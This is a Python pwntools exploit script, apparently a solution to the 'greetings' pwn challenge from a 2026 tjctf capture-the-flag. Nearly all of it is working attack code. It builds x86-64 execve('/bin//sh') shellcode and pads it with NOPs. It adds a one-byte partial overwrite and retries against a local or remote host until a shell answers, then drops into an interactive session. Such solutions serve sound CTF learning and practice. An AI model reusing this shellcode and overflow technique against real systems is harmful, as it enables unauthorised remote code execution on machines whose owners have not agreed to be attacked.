#!/usr/bin/env python3
import os
import sys

from pwn import *

TARGET_PATH = os.path.realpath("/ctf-writeups/2026/tjctf/pwn/greetings/dist/greetings")

elf = context.binary = ELF(TARGET_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h", "-l 65%"])


def get_stream():
    if "remote" in sys.argv:
        return remote("tjc.tf", 31373)

    return process(TARGET_PATH)


def attach_gdb(r):
    if "debug" not in sys.argv:
        return

    bkps = ["*greetUser+102"]
    cmds = ["c"]

    gdbscript = ["break {}".format(x) for x in bkps] + cmds
    gdb.attach(r, "\n".join(gdbscript))


def send(r, msg):
    if "remote" in sys.argv:
        r.sendlineafter(b": ", msg)
        return

    r.sendline(msg)


def exploit():
    shellcode = asm("""
        xor esi, esi
        push rsi
        mov rbx, 0x68732f2f6e69622f
        push rbx
        push rsp
        pop rdi
        imul esi
        mov al, 0x3b
        syscall
    """)

    while True:
        r = get_stream()
        attach_gdb(r)

        try:
            payload = shellcode.ljust(0x48, b"\x90")
            payload += b"\xdf"

            send(r, f"{len(payload) - 1}".encode())
            send(r, payload)

            r.sendline(b"echo PWNED")
            res = r.recv(timeout=0.5)

            if b"PWNED" in res:
                r.interactive()
                break
            else:
                r.close()
        except EOFError:
            r.close()
            continue
        except KeyboardInterrupt:
            r.close()
            break


def main():
    exploit()


if __name__ == "__main__":
    main()
